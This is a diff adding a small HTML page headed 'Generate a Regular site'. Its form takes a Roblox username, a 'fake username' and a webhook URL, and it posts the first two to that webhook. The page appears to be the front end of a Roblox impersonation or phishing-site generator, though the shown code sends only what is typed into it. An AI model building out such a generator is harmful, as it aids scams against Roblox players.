@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox Submission</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to right, #f8f9fa, #e9ecef);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+            width: 320px;
+        }
+        h2 {
+            text-align: center;
+        }
+        label {
+            font-weight: bold;
+            font-size: 0.9rem;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-top: 6px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            background: linear-gradient(to right, #ff416c, #ff4b2b);
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 1rem;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        button:hover {
+            opacity: 0.9;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Generate a <strong>Regular</strong> site</h2>
+        <form id="siteForm">
+            <label for="robloxUsername">ROBLOX USERNAME</label>
+            <input type="text" id="robloxUsername" required>
+
+            <label for="displayName">FAKE USERNAME</label>
+            <input type="text" id="displayName">
+
+            <label for="webhookUrl">WEBHOOK</label>
+            <input type="url" id="webhookUrl" required>
+
+            <button type="submit">Create Now!</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('siteForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('robloxUsername').value;
+            const displayName = document.getElementById('displayName').value || 'Anonymous';
+            const webhookUrl = document.getElementById('webhookUrl').value;
+
+            const payload = {
+                content: `📥 New submission:\n👤 Roblox Username: ${username}\n🧪 Display Name: ${displayName}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("✅ Submitted successfully!");
+                } else {
+                    alert("❌ Submission failed. Check your webhook URL.");
+                }
+            })
+            .catch(error => {
+                alert("⚠️ Error: " + error.message);
+            });
+        });
+    </script>
+</body>
+</html>
